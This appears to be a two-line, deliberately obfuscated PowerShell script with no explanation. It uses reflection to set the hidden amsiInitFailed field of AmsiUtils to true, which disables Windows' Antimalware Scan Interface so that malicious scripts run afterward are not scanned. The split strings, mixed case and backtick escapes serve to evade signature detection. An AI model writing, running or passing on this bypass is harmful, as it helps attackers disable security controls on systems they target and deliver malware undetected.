﻿$REf=[REf].AssembLY.GeTTyPE('System.Management.Automation.A'+'msi'+'Utils');
$REf."GET`FI`ElD"('ams'+'iInitF'+'ailed','NonP'+'ublic,S'+'tatic')."Set`VaLue"($nUlL,$TrUe);